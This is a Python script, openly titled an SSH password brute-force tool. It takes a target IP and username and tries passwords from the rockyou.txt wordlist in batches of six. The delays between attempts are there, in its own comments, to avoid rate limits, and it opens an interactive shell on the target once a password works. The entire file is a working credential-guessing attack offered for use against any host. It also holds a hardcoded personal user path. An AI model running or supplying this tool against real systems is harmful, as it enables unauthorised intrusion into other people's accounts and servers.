#!/usr/bin/env python3
"""
SSH Password Brute-Force Script
Reads passwords from ~/Downloads/rockyou.txt, tries 6 at a time,
restarting the SSH connection between batches.
"""

import os
import sys
import time
import pexpect


def get_user_input():
    """Prompt the user for the target IP address and username."""
    print("=" * 50)
    print("SSH Password Brute-Force Tool")
    print("=" * 50)
    ip = input("Enter target IP address: ").strip()
    username = input("Enter SSH username: ").strip()
    if not ip or not username:
        print("[!] IP address and username are required.")
        sys.exit(1)
    return ip, username


def load_passwords(filepath="~/Downloads/rockyou.txt"):
    """Load passwords from the rockyou.txt wordlist."""
    expanded_path = os.path.expanduser(filepath)
    if not os.path.exists(expanded_path):
        print(f"[!] Password file not found: {expanded_path}")
        print("[!] Make sure ~/Downloads/rockyou.txt exists.")
        sys.exit(1)

    with open(expanded_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[+] Loaded {len(passwords)} passwords from {expanded_path}")
    return passwords


def try_passwords(ip, username, passwords, batch_size=6):
    """
    Attempt to SSH into the target using passwords in batches.
    After each batch of `batch_size` attempts, restarts the connection.
    """
    total = len(passwords)
    batch_num = 0

    for i in range(0, total, batch_size):
        batch = passwords[i : i + batch_size]
        batch_num += 1
        remaining = total - i

        print(f"\n{'=' * 50}")
        print(
            f"[*] Batch {batch_num} | Passwords {i + 1}-{i + len(batch)} "
            f"of {total} | {remaining} remaining"
        )
        print(f"{'=' * 50}")

        ssh_command = f"ssh -o StrictHostKeyChecking=no {username}@{ip}"

        for attempt, password in enumerate(batch, start=1):
            print(
                f"\n[*] Batch {batch_num}, Attempt {attempt}/{len(batch)}: "
                f"Trying password: {password}"
            )

            try:
                child = pexpect.spawn(ssh_command, timeout=15, encoding="utf-8")

                # Wait for password prompt
                idx = child.expect(
                    [
                        "password:",
                        "Password:",
                        "Permission denied",
                        "Connection refused",
                        "No route to host",
                        "Host key verification failed",
                        pexpect.EOF,
                        pexpect.TIMEOUT,
                    ],
                    timeout=15,
                )

                if idx in [0, 1]:  # Password prompt received
                    child.sendline(password)
                    # Wait to see if login succeeds or fails
                    result_idx = child.expect(
                        [
                            "password:",  # Wrong password, prompt again
                            "Password:",  # Wrong password, prompt again
                            "Permission denied",
                            "Last login",  # Successful login indicator
                            "Welcome",  # Successful login indicator
                            r"\$",  # Shell prompt (success)
                            "#",  # Root shell prompt
                            pexpect.EOF,
                            pexpect.TIMEOUT,
                        ],
                        timeout=15,
                    )

                    if result_idx in [3, 4, 5, 6]:
                        print("\n" + "!" * 50)
                        print(f"[!!!!] PASSWORD FOUND: {password}")
                        print("!" * 50)
                        print(f"\n[+] SSH connection established as {username}@{ip}")
                        print("[+] Interactive shell is now active.\n")

                        # Return control to the user for the interactive session
                        child.interact()
                        return password
                    else:
                        print(f"[-] Incorrect password: {password}")

                elif idx in [2, 3, 4, 5]:  # Immediate failure
                    print(f"[-] Connection issue detected. Skipping batch...")
                    child.close()
                    time.sleep(2)
                    break
                else:
                    print(f"[-] Unexpected response. Skipping...")
                    child.close()
                    break

            except pexpect.TIMEOUT:
                print(f"[-] Timeout waiting for password prompt. Skipping...")
                try:
                    child.close()
                except Exception:
                    pass
            except Exception as e:
                print(f"[-] Error: {e}")
                try:
                    child.close()
                except Exception:
                    pass
            finally:
                try:
                    child.close()
                except Exception:
                    pass

            # Small delay between attempts to avoid triggering rate limits
            if attempt < len(batch):
                time.sleep(1)

        # Delay between batches to allow connection cleanup
        if i + batch_size < total:
            print(f"\n[*] Restarting connection for next batch...")
            time.sleep(3)

    print("\n[-] Password not found in wordlist.")
    return None


def main():
    ip, username = get_user_input()

    wordlist_path = os.path.expanduser("~/Downloads/rockyou.txt")
    if not os.path.exists(wordlist_path):
        # Also check the Desktop/Downloads path
        alt_paths = [
            "/Users/bestmomeverbuchholz/Downloads/rockyou.txt",
            "/Users/bestmomeverbuchholz/Desktop/downloads/rockyou.txt",
        ]
        for alt in alt_paths:
            if os.path.exists(alt):
                wordlist_path = alt
                break
        else:
            print(f"[!] Cannot find rockyou.txt. Checked:")
            print(f"    ~/Downloads/rockyou.txt")
            for alt in alt_paths:
                print(f"    {alt}")
            sys.exit(1)

    passwords = load_passwords(wordlist_path)

    print(f"\n[*] Target: {username}@{ip}")
    print(f"[*] Total passwords: {len(passwords)}")
    print(f"[*] Batch size: 6")
    print(f"[*] Estimated batches: {len(passwords) // 6 + 1}")
    print("-" * 50)

    time.sleep(1)

    result = try_passwords(ip, username, passwords, batch_size=6)

    if result:
        print(f"\n[+] Password successfully found: {result}")
    else:
        print("\n[-] Exhausted all passwords without success.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Aborted by user.")
        sys.exit(0)